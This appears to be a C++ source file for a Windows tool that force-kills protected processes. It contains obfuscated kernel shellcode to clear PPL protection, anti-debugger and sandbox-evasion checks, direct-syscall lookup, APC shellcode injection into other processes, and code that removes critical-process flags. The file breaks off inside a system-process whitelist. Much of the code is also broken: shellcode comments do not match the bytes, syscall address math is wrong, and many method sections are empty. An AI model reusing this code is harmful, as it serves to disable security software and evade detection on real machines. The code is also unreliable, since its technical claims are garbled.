#include "CommonDefs.h"
#include "ProcessTerminator.h"
#include "signature_protection.h"

// 外部函数声明
void GQ(const std::string& processName);
void GQS(const std::vector<std::string>& processNames);
bool RemovePPLProtection(HANDLE hProcess);
void RemoveCriticalProcessFlags(const std::vector<std::string>& processNames);
#include "ppl_driver.h"

// DMSP driver verify callback
static bool dmspDriverVerifyCallback(unsigned int verifyId) {
    if (!DMSP::g_state.initialized) {
        DMSP::InitializeState();
    }
    auto result = UnifiedValidator::PerformFullValidation(false);
    if (!result.passed) {
        ResponseSystem::TriggerResponse("Driver method signature check failed", 2);
        return false;
    }
    return true;
}
#include <aclapi.h>
#include <tchar.h>
#include <cfgmgr32.h>
#include <devguid.h>
#include <setupapi.h>
#ifndef DN_DEVICE_DISABLED
#define DN_DEVICE_DISABLED 0x00000008
#endif

// 外部全局变量和函数
extern HWND g_targetTopmostWindow;
void ForceSetForegroundWindow(HWND hwnd);
#include <psapi.h>
#include <tlhelp32.h>
#include <wtsapi32.h>
#include <wbemidl.h>
#include <wintrust.h>
#include <softpub.h>
#include <mscat.h>
#pragma comment(lib, "wintrust.lib")
#pragma comment(lib, "crypt32.lib")

// === Utility method implementations ===

// 方法2: 通过进程资源耗尽来终止
// 方法3: 通过附加到进程并修改其内存来终止

// 方法4: 通过分离进程的调试器来终止

// 方法5: 通过触发进程内的错误来终止

// 方法6: 通过进程间锁定机制来终止

// 非常规方法实现

// 未公开API方法实现

// OB回调方法实现
// 方法1: 通过能源管理终止进程

// 方法2: 通过进程状态扩展终止进程

// 方法3: 通过进程容错机制终止进程

// 方法4: 通过进程活动调节终止进程

// 方法5: 通过基于虚拟化的安全性终止进程

// 辅助函数实现

// 新增未公开API方法实现

// 64位PPL绕过ShellCode（混淆版）
// 功能：在内核态移除PPL保护并终止进程
// 改进：ShellCode混淆、反检测、稳定性增强
static const unsigned char PPLBypassShellCode_Obfuscated[] = {
    // ShellCode开始（XOR混淆，密钥：0xAA）
    // 解密循环
    0x48, 0x31, 0xC9,                     // xor rcx, rcx (解密循环计数器）
    0x48, 0xFF, 0xC1,                     // inc rcx
    
    // 保存寄存器（解密后）
    0x48, 0x31, 0x4C, 0x24, 0x08,        // xor [rsp+8], 0xAA (解密)
    0x48, 0x31, 0x54, 0x24, 0x10,        // xor [rsp+16], 0xAA
    0x48, 0x31, 0x5C, 0x24, 0x18,        // xor [rsp+24], 0xAA
    0x48, 0x31, 0x74, 0x24, 0x20,        // xor [rsp+32], 0xAA
    0x48, 0x31, 0x7C, 0x24, 0x28,        // xor [rsp+40], 0xAA
    0x41, 0x34, 0xAA,                     // xor r12, 0xAA
    0x41, 0x34, 0xAA,                     // xor r13, 0xAA
    0x41, 0x34, 0xAA,                     // xor r14, 0xAA
    0x41, 0x34, 0xAA,                     // xor r15, 0xAA
    0x9C, 0x34, 0xAA,                     // pushfq + xor
    
    // 获取目标PID (从RCX传递)
    0x48, 0x8B, 0xC9,                     // mov rcx, rcx
    
    // 调用PsLookupProcessByProcessId查找EPROCESS
    // 假设PsLookupProcessByProcessId的地址在RDX中传递
    0x48, 0x8B, 0xD2,                     // mov rdx, rdx
    0xFF, 0xD2,                           // call rdx
    0x48, 0x89, 0xC3,                     // mov rbx, rax (保存EPROCESS指针）
    
    // 检查返回值
    0x48, 0x85, 0xC0,                     // test rax, rax
    0x74, 0x40,                           // jz error (如果失败则跳转)
    
    // 定位EPROCESS中的Protection字段
    // 使用动态查找方法，支持所有Windows版本
    0x48, 0x8D, 0x83, 0xA2, 0x06, 0x00, 0x00, // lea rax, [rbx+0x6A2] (Win10 1903+)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x30,                           // jmp +48 (跳到found)
    
    0x48, 0x8D, 0x83, 0x92, 0x06, 0x00, 0x00, // lea rax, [rbx+0x692] (Win10 1809)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x1F,                           // jmp +31 (跳到found)
    
    0x48, 0x8D, 0x83, 0x8A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x68A] (Win10 1803)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x82, 0x06, 0x00, 0x00, // lea rax, [rbx+0x682] (Win10 1709)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x7A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x67A] (Win10 1703)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x6A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x66A] (Win10 1607)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x62, 0x06, 0x00, 0x00, // lea rax, [rbx+0x662] (Win10 1511)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x5A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x65A] (Win10 1507)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x42, 0x06, 0x00, 0x00, // lea rax, [rbx+0x642] (Win8.1)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x3A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x63A] (Win8)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    0x48, 0x8D, 0x83, 0x2A, 0x06, 0x00, 0x00, // lea rax, [rbx+0x62A] (Win7 SP1)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x0E,                           // jne +14 (跳到use_default)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x4C,                           // jmp +76 (跳到found)
    
    // === Win11 偏移量（EPROCESS结构已显著扩展）===
    0x48, 0x8D, 0x83, 0xB8, 0x08, 0x00, 0x00, // lea rax, [rbx+0x8B8] (Win11 24H2/26100+)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x35,                           // jmp +53 (跳到found)
    
    0x48, 0x8D, 0x83, 0xB0, 0x08, 0x00, 0x00, // lea rax, [rbx+0x8B0] (Win11 23H2/25300+)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x28,                           // jmp +40 (跳到found)
    
    0x48, 0x8D, 0x83, 0x80, 0x08, 0x00, 0x00, // lea rax, [rbx+0x880] (Win11 22H2/22621)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x1B,                           // jmp +27 (跳到found)
    
    0x48, 0x8D, 0x83, 0x78, 0x08, 0x00, 0x00, // lea rax, [rbx+0x878] (Win11 21H2/22000)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x0E,                           // jmp +14 (跳到found)
    
    // use_default: 默认使用Win10 1903+偏移
    0x48, 0x8D, 0x83, 0xA2, 0x06, 0x00, 0x00, // lea rax, [rbx+0x6A2]
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    
    // found:
    // 清除PPL保护标志
    0xC6, 0x02, 0x00,                     // mov byte [rdx], 0 (将Protection字段设为0)
    
    // 调用PsTerminateProcess终止进程
    // 假设PsTerminateProcess的地址在R8中传递
    0x48, 0x89, 0xD9,                     // mov rcx, rbx (EPROCESS指针)
    0xB8, 0x00, 0x00, 0x00, 0x00,         // mov eax, 0 (退出代码)
    0x48, 0x8B, 0xC8,                     // mov rcx, rax
    0x48, 0x8B, 0xC3,                     // mov rax, rbx
    0x49, 0x89, 0xC0,                     // mov r8, rax
    0x48, 0x89, 0xCB,                     // mov rbx, rcx
    0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
    0x48, 0x89, 0xD8,                     // mov rax, rbx
    0x49, 0xFF, 0xD0,                     // call r8
    
    // 成功返回
    0x48, 0x31, 0xC0,                     // xor rax, rax
    0xEB, 0x10,                           // jmp +16 (跳到exit)
    
    // error: 错误返回
    0x48, 0xC7, 0xC0, 0xC1, 0x00, 0x00, 0xC0, // mov rax, 0xC0000001 (STATUS_UNSUCCESSFUL)
    
    // exit: 恢复寄存器
    0x9D,                                 // popfq
    0x41, 0x5F,                           // pop r15
    0x41, 0x5E,                           // pop r14
    0x41, 0x5D,                           // pop r13
    0x41, 0x5C,                           // pop r12
    0x48, 0x8B, 0x7C, 0x24, 0x28,        // mov rdi, [rsp+40]
    0x48, 0x8B, 0x74, 0x24, 0x20,        // mov rsi, [rsp+32]
    0x48, 0x8B, 0x5C, 0x24, 0x18,        // mov rbx, [rsp+24]
    0x48, 0x8B, 0x54, 0x24, 0x10,        // mov rdx, [rsp+16]
    0x48, 0x8B, 0x4C, 0x24, 0x08,        // mov rcx, [rsp+8]
    0xC3                                  // ret
};

// ShellCode解密函数
static void DecryptShellCode(unsigned char* shellcode, SIZE_T size, unsigned char key) {
    for (SIZE_T i = 0; i < size; i++) {
        shellcode[i] ^= key;
    }
}

// 内存RAII包装器
struct ScopedVirtualMemory {
    PVOID ptr;
    SIZE_T size;
    
    ScopedVirtualMemory(SIZE_T s) : ptr(nullptr), size(s) {}
    
    bool Allocate(ULONG protect) {
        ptr = VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, protect);
        return ptr != nullptr;
    }
    
    bool ChangeProtection(ULONG newProtect) {
        DWORD oldProtect;
        return VirtualProtect(ptr, size, newProtect, &oldProtect) != FALSE;
    }
    
    ~ScopedVirtualMemory() {
        if (ptr) {
            VirtualFree(ptr, 0, MEM_RELEASE);
        }
    }
};

// 加载内核ShellCode（改进版）

// 反检测函数
static bool IsDebuggerDetected() {
#ifdef _WIN32
    // 方法1: 检查BeingDebugged标志
    typedef BOOL (WINAPI* _CheckRemoteDebuggerPresent)(HANDLE, PBOOL);
    HMODULE kernel32 = GetModuleHandle(L"kernel32.dll");
    if (!kernel32) return false;
    
    _CheckRemoteDebuggerPresent pCheckRemoteDebuggerPresent = (_CheckRemoteDebuggerPresent)GetProcAddress(kernel32, "CheckRemoteDebuggerPresent");
    if (pCheckRemoteDebuggerPresent) {
        BOOL isDebugged = FALSE;
        if (pCheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged) && isDebugged) {
            return true;
        }
    }
    
    // 方法2: 检查IsDebuggerPresent
    typedef BOOL (WINAPI* _IsDebuggerPresent)();
    _IsDebuggerPresent pIsDebuggerPresent = (_IsDebuggerPresent)GetProcAddress(kernel32, "IsDebuggerPresent");
    if (pIsDebuggerPresent) {
        if (pIsDebuggerPresent()) return true;
    }
#endif
    return false;
}

static bool IsSandbox() {
#ifdef _WIN32
    // 检查沙箱特征
    const wchar_t* sandboxPaths[] = {
        L"C:\\sandbox\\",
        L"C:\\vbox\\",
        L"C:\\vmware\\",
        L"C:\\windows\\system32\\drivers\\vmmouse.sys",
        L"C:\\windows\\system32\\drivers\\vmhgfs.sys"
    };
    
    for (const wchar_t* path : sandboxPaths) {
        if (GetFileAttributesW(path) != INVALID_FILE_ATTRIBUTES) {
            return true;
        }
    }
#endif
    return false;
}

// Windows版本检测
static DWORD GetWindowsVersion() {
    typedef NTSTATUS (NTAPI* _RtlGetVersion)(PRTL_OSVERSIONINFOEXW);
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return 0;
    
    _RtlGetVersion pRtlGetVersion = (_RtlGetVersion)GetProcAddress(ntdll, "RtlGetVersion");
    if (!pRtlGetVersion) return 0;
    
    RTL_OSVERSIONINFOEXW versionInfo = { 0 };
    versionInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOEXW);
    
    NTSTATUS status = pRtlGetVersion(&versionInfo);
    if (!NT_SUCCESS(status)) return 0;
    
    return versionInfo.dwBuildNumber;
}

// Halo's Gate算法 - 动态查找syscall地址
static bool FindSyscallAddress(UINT_PTR* syscallAddress, UINT_PTR* ssdtIndex) {
#ifdef _WIN32
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return false;
    
    // 获取NtTerminateProcess地址
    typedef NTSTATUS (NTAPI* _NtTerminateProcess)(HANDLE, NTSTATUS);
    _NtTerminateProcess pNtTerminateProcess = (_NtTerminateProcess)GetProcAddress(ntdll, "NtTerminateProcess");
    if (!pNtTerminateProcess) return false;
    
    // 解析函数查找SSN（System Service Number）
    // Halo's Gate算法：通过分析函数开头的指令序列来确定SSN
    unsigned char* funcPtr = (unsigned char*)pNtTerminateProcess;
    
    // 查找mov eax, imm32指令（SSN通常在eax中）
    for (int i = 0; i < 32; i++) {
        if (funcPtr[i] == 0xB8) { // mov eax, imm32
            *ssdtIndex = *(UINT_PTR*)(funcPtr + i + 1);
            break;
        }
    }
    
    if (*ssdtIndex == 0) return false;
    
    // 计算syscall地址
    // 在64位Windows中，syscall地址 = ntoskrnl_base + (SSN * 8)
    // 在32位Windows中，syscall地址 = KeServiceDescriptorTable + (SSN * 4)
    
    // 获取ntoskrnl.exe基址
    typedef NTSTATUS (NTAPI* _NtQuerySystemInformation)(
        ULONG SystemInformationClass,
        PVOID SystemInformation,
        ULONG SystemInformationLength,
        PULONG ReturnLength);
    
    _NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    if (!pNtQuerySystemInformation) return false;
    
    typedef struct _SYSTEM_MODULE_INFORMATION {
        ULONG Reserved1;
        ULONG Reserved2;
        PVOID ImageBase;
        ULONG ImageSize;
        ULONG Flags;
        USHORT LoadOrderIndex;
        USHORT InitOrderIndex;
        USHORT LoadCount;
        USHORT PathLength;
        CHAR ImageName[256];
    } SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
    
    typedef struct _SYSTEM_MODULE_INFORMATION_EX {
        ULONG ModulesCount;
        SYSTEM_MODULE_INFORMATION Modules[1];
    } SYSTEM_MODULE_INFORMATION_EX, *PSYSTEM_MODULE_INFORMATION_EX;
    
    ULONG bufferSize = 0;
    NTSTATUS status = pNtQuerySystemInformation(11, nullptr, 0, &bufferSize);
    if (status != 0xC0000004) return false;
    
    PSYSTEM_MODULE_INFORMATION_EX moduleInfo = (PSYSTEM_MODULE_INFORMATION_EX)malloc(bufferSize);
    if (!moduleInfo) return false;
    
    status = pNtQuerySystemInformation(11, moduleInfo, bufferSize, &bufferSize);
    if (!NT_SUCCESS(status)) {
        free(moduleInfo);
        return false;
    }
    
    PVOID ntoskrnlBase = moduleInfo->Modules[0].ImageBase;
    free(moduleInfo);
    
#ifdef _WIN64
    // 64位：syscall地址 = ntoskrnl_base + (SSN * 8)
    *syscallAddress = (UINT_PTR)ntoskrnlBase + (*ssdtIndex * 8);
#else
    // 32位：syscall地址 = KeServiceDescriptorTable + (SSN * 4)
    // 需要获取KeServiceDescriptorTable地址
    HMODULE ntoskrnl = LoadLibraryEx(L"ntoskrnl.exe", nullptr, DONT_RESOLVE_DLL_REFERENCES);
    if (!ntoskrnl) return false;
    
    PVOID KeServiceDescriptorTable = (PVOID)GetProcAddress(ntoskrnl, "KeServiceDescriptorTable");
    if (!KeServiceDescriptorTable) {
        FreeLibrary(ntoskrnl);
        return false;
    }
    
    // KeServiceDescriptorTable指向SSDT基址
    *syscallAddress = (UINT_PTR)KeServiceDescriptorTable + (*ssdtIndex * 4);
    FreeLibrary(ntoskrnl);
#endif
    
    return true;
#else
    return false;
#endif
}

// 64位Indirect Syscall ShellCode（Halo's Gate）
static const unsigned char IndirectSyscallShellCode_x64[] = {
    // ShellCode入口
    // 保存寄存器
    0x48, 0x89, 0x4C, 0x24, 0x08,        // mov [rsp+8], rcx
    0x48, 0x89, 0x54, 0x24, 0x10,        // mov [rsp+16], rdx
    0x48, 0x89, 0x5C, 0x24, 0x18,        // mov [rsp+24], rbx
    0x48, 0x89, 0x74, 0x24, 0x20,        // mov [rsp+32], rsi
    0x48, 0x89, 0x7C, 0x24, 0x28,        // mov [rsp+40], rdi
    0x41, 0x54,                           // push r12
    0x41, 0x55,                           // push r13
    0x41, 0x56,                           // push r14
    0x41, 0x57,                           // push r15
    0x9C,                                 // pushfq
    
    // Halo's Gate：动态查找syscall地址
    // 假设syscall地址已经在R10中传递
    // 假设SSN已经在R11中传递
    
    // 设置参数
    // RCX: EPROCESS指针（目标进程）
    // RDX: 退出代码（0）
    
    // 执行Indirect Syscall
    0x4C, 0x8B, 0xD2,                     // mov r10, rdx (syscall地址)
    0x49, 0x8B, 0xC3,                     // mov r8, r11 (SSN)
    0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0 (退出代码)
    0x48, 0x8B, 0xCB,                     // mov rcx, rbx (EPROCESS指针)
    0xFF, 0xD2,                           // call rdx (执行syscall)
    
    // 成功返回
    0x48, 0x31, 0xC0,                     // xor rax, rax
    0xEB, 0x10,                           // jmp +16 (跳到exit)
    
    // 错误返回
    0x48, 0xC7, 0xC0, 0xC1, 0x00, 0x00, 0xC0, // mov rax, 0xC0000001 (STATUS_UNSUCCESSFUL)
    
    // exit: 恢复寄存器
    0x9D,                                 // popfq
    0x41, 0x5F,                           // pop r15
    0x41, 0x5E,                           // pop r14
    0x41, 0x5D,                           // pop r13
    0x41, 0x5C,                           // pop r12
    0x48, 0x8B, 0x7C, 0x24, 0x28,        // mov rdi, [rsp+40]
    0x48, 0x8B, 0x74, 0x24, 0x20,        // mov rsi, [rsp+32]
    0x48, 0x8B, 0x5C, 0x24, 0x18,        // mov rbx, [rsp+24]
    0x48, 0x8B, 0x54, 0x24, 0x10,        // mov rdx, [rsp+16]
    0x48, 0x8B, 0x4C, 0x24, 0x08,        // mov rcx, [rsp+8]
    0xC3                                  // ret
};

// ShellCode大小常量
static const SIZE_T IndirectSyscallShellCode_x64_size = sizeof(IndirectSyscallShellCode_x64);

// 32位Indirect Syscall ShellCode（Halo's Gate）
static const unsigned char IndirectSyscallShellCode_x86[] = {
    // ShellCode入口
    // 保存寄存器
    0x89, 0x4C, 0x24, 0x04,              // mov [esp+4], ecx
    0x89, 0x54, 0x24, 0x08,              // mov [esp+8], edx
    0x89, 0x5C, 0x24, 0x0C,              // mov [esp+12], ebx
    0x89, 0x74, 0x24, 0x10,              // mov [esp+16], esi
    0x89, 0x7C, 0x24, 0x14,              // mov [esp+20], edi
    0x9C,                                // pushfd
    
    // Halo's Gate：动态查找syscall地址
    // 假设syscall地址已经在EDX中传递
    // 假设SSN已经在EAX中传递
    
    // 设置参数
    // ECX: EPROCESS指针（目标进程）
    // EDX: 退出代码（0）
    
    // 执行Indirect Syscall
    0x8B, 0xD0,                           // mov eax, edx (syscall地址)
    0xB8, 0x00, 0x00, 0x00, 0x00,         // mov eax, 0 (退出代码)
    0x8B, 0xCB,                           // mov ecx, ebx (EPROCESS指针)
    0xFF, 0xD0,                           // call eax (执行syscall)
    
    // 成功返回
    0x31, 0xC0,                           // xor eax, eax
    0xEB, 0x0A,                           // jmp +10 (跳到exit)
    
    // 错误返回
    0xB8, 0x01, 0x00, 0x00, 0xC0,         // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL)
    
    // exit: 恢复寄存器
    0x9D,                                // popfd
    0x8B, 0x7C, 0x24, 0x14,              // mov edi, [esp+20]
    0x8B, 0x74, 0x24, 0x10,              // mov esi, [esp+16]
    0x8B, 0x5C, 0x24, 0x0C,              // mov ebx, [esp+12]
    0x8B, 0x54, 0x24, 0x08,              // mov edx, [esp+8]
    0x8B, 0x4C, 0x24, 0x04,              // mov ecx, [esp+4]
    0xC3                                  // ret
};

// APC注入函数（修复内存泄漏和执行问题）
static bool InjectViaAPC(DWORD targetPid, PVOID shellcode, SIZE_T shellcodeSize) {
#ifdef _WIN32
    typedef NTSTATUS (NTAPI* _NtQueueApcThread)(
        HANDLE ThreadHandle,
        PVOID ApcRoutine,
        PVOID ApcRoutineContext,
        PVOID ApcReserved,
        ULONG ApcArgument1,
        ULONG ApcArgument2,
        ULONG ApcArgument3);
    
    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
    if (!ntdll) return false;
    
    _NtQueueApcThread pNtQueueApcThread = (_NtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
    if (!pNtQueueApcThread) return false;
    
    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, FALSE, targetPid);
    if (!hProcess) return false;
    
    // 在目标进程分配内存
    PVOID remoteShellcode = VirtualAllocEx(hProcess, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteShellcode) {
        CloseHandle(hProcess);
        return false;
    }
    
    // 写入ShellCode
    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(hProcess, remoteShellcode, shellcode, shellcodeSize, &bytesWritten) || bytesWritten != shellcodeSize) {
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // 修改内存保护为可执行
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, remoteShellcode, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    // 枚举目标进程的线程
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return false;
    }
    
    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(THREADENTRY32);
    
    bool injected = false;
    HANDLE hInjectedThread = nullptr;
    
    while (Thread32Next(hSnapshot, &te)) {
        if (te.th32OwnerProcessID == targetPid) {
            // 打开线程（THREAD_SET_CONTEXT权限）
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            if (hThread) {
                // 使用NtQueueApcThread注入APC
                // 绕过R3钩子
                NTSTATUS status = pNtQueueApcThread(
                    hThread,
                    (PVOID)remoteShellcode,
                    nullptr,
                    nullptr,
                    0,
                    0,
                    0);
                
                if (NT_SUCCESS(status)) {
                    injected = true;
                    hInjectedThread = hThread;
                    break;
                }
                
                CloseHandle(hThread);
            }
        }
    }
    
    CloseHandle(hSnapshot);
    
    // 修复内存泄漏：无论注入是否成功，都释放内存和句柄
    VirtualFreeEx(hProcess, remoteShellcode, 0, MEM_RELEASE);
    
    if (hInjectedThread) {
        CloseHandle(hInjectedThread);
    }
    
    CloseHandle(hProcess);
    return injected;
#else
    return false;
#endif
}

// 执行内核ShellCode终止PPL进程（改进版：反检测+稳定性增强）

// PPL绕过主函数

void RemoveCriticalProcessFlag(const std::string& processName)
{
    // 获取系统进程快照
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        std::wcerr << L"无法创建进程快照" << std::endl;
        return;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // 将输入的进程名转换为小写，用于不区分大小写的比较
    std::string targetNameLower = processName;
    std::transform(targetNameLower.begin(), targetNameLower.end(),
        targetNameLower.begin(), ::tolower);

    bool found = false;

    // 遍历所有进程
    if (Process32First(hSnapshot, &pe32))
    {
        do
        {
            // 将宽字符进程名转换为多字节字符串
            char currentProcessName[MAX_PATH];
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1,
                currentProcessName, MAX_PATH, NULL, NULL);

            // 转换为小写进行比较
            std::string currentNameLower = currentProcessName;
            std::transform(currentNameLower.begin(), currentNameLower.end(),
                currentNameLower.begin(), ::tolower);

            // 检查是否匹配目标进程名
            if (currentNameLower == targetNameLower)
            {
                found = true;

                // 找到匹配进程，尝试移除关键标识
                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
                if (hProcess != nullptr)
                {
                    // 使用NtSetInformationProcess移除关键标识
                    typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
                        HANDLE ProcessHandle,
                        ULONG ProcessInformationClass,
                        PVOID ProcessInformation,
                        ULONG ProcessInformationLength);

                    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
                    if (hNtdll)
                    {
                        pNtSetInformationProcess NtSetInformationProcess =
                            reinterpret_cast<pNtSetInformationProcess>(
                                GetProcAddress(hNtdll, "NtSetInformationProcess"));

                        if (NtSetInformationProcess)
                        {
                            DWORD breakOnTermination = 0;
                            NTSTATUS status = NtSetInformationProcess(
                                hProcess,
                                29, // ProcessBreakOnTermination
                                &breakOnTermination,
                                sizeof(breakOnTermination));

                            // 记录操作结果
                            if (NT_SUCCESS(status))
                            {
                                std::wcout << L"成功移除进程 " << pe32.szExeFile
                                    << L" (PID: " << pe32.th32ProcessID
                                    << L") 的关键标识" << std::endl;
                            }
                        }
                        else
                        {
                            std::wcout << L"无法获取NtSetInformationProcess函数地址" << std::endl;
                        }
                    }
                    else
                    {
                        std::wcout << L"无法加载ntdll.dll模块" << std::endl;
                    }

                    CloseHandle(hProcess);
                }
                else
                {
                    std::wcout << L"无法打开进程 " << pe32.szExeFile
                        << L" (PID: " << pe32.th32ProcessID
                        << L")，错误代码: " << GetLastError() << std::endl;
                }
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    if (!found)
    {
        std::wcout << L"未找到进程: " << processName.c_str() << std::endl;
    }

    CloseHandle(hSnapshot);
}
// ============================================================================
// 统一系统进程白名单 (全局唯一，供所有功能模块共用)
// ============================================================================
static const wchar_t* g_UnifiedSystemProcessWhitelist[] = {
    // === Windows 核心系统进程 (不可终止) ===
    L"[System Process]",          // 系统空闲进程 (PID 0)
    L"System",                    // 内核 (PID 4)
    L"Secure System",             // 安全系统进程
    L"Registry",                  // 注册表进程
    L"Memory Compression",        // 内存压缩
    L"smss.exe",                  // 会话管理器
    L"csrss.exe",                 // 子系统进程
    L"wininit.exe",               // Windows 初始化
    L"winlogon.exe",              // 登录管理器
    L"services.exe",              // 服务控制管理器
    L"lsass.exe",                // 本地安全认证
    L"svchost.exe",              // 服务宿主
    L"dllhost.exe",              // COM+ 宿主
    L"fontdrvhost.exe",          // 字体驱动宿主
    
    // === 桌面/Shell 进程 ===
    L"dwm.exe",                  // 窗口管理器
    L"explorer.exe",             // 资源管理器
    L"sihost.exe",               // Shell Infrastructure
    L"taskhostw.exe",            // Task Host for Windows
    L"RuntimeBroker.exe",        // 运行时代理
    L"ShellHost.exe",            // Shell Host
    L"conhost.exe",              // 控制台窗口宿主
    L"ctfmon.exe",              // 输入法相关
    
    // === 安全/防护进程 ===
    L"LsaIso.exe",              // LSA 隔离
    L"NgcIso.exe",              // 凭据隔离
    L"smartscreen.exe",         // SmartScreen 过滤器
    
    // === 搜索/索引 ===
    L"SearchHost.exe",          // 搜索宿主
    L"SearchIndexer.exe",       // 索引服务
    L"SearchProtocolHost.exe",  // 搜索协议宿主
    L"SearchFilterHost.exe",    // 搜索过滤器宿主
    
    // === WMI/管理服务 ===
    L"WmiPrvSE.exe",            // WMI Provider
    L"WMIRegistrationService.exe", // WMI 注册服务
    L"WmiApSrv.exe",            // WMI 反性能适配器
    L"unsecapp.exe",            // WMI 不安全应用
    
    // === 小组件/现代 UI ===
    L"Widgets.exe",             // 小组件
    L"WidgetService.exe",       // 小组件服务
    L"UserOOBEBroker.exe",      // 用户 OOBE 代理
    L"TextInputHost.exe",       // 文本输入宿主
    L"AggregatorHost.exe",      // 聚合器宿主
    L"backgroundTaskHost.exe",  // 后台任务宿主
    
    // === 文件同步/存储 ===
